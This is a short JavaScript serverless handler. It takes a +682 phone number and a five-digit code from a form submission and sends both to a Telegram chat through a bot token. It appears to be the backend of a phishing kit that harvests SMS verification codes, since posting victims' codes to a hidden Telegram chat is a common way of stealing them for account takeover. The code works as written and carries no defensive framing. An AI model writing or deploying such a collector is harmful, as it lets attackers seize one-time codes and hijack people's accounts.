// Submit last 5 digits to Telegram
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  try {
    const { phone, digits } = req.body || {};
    if (!phone || !/^\+682\d{5}$/.test(phone)) throw new Error('Invalid number');
    if (!digits || !/^\d{5}$/.test(digits)) throw new Error('Provide 5 digits');
    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) throw new Error('Telegram not configured');

    const text = `Digits for ${phone}: ${digits}`;
    const tg = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
    });
    if (!tg.ok) throw new Error('Telegram request failed');

    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(400).json({ error: err?.message || 'Unknown error' });
  }
}
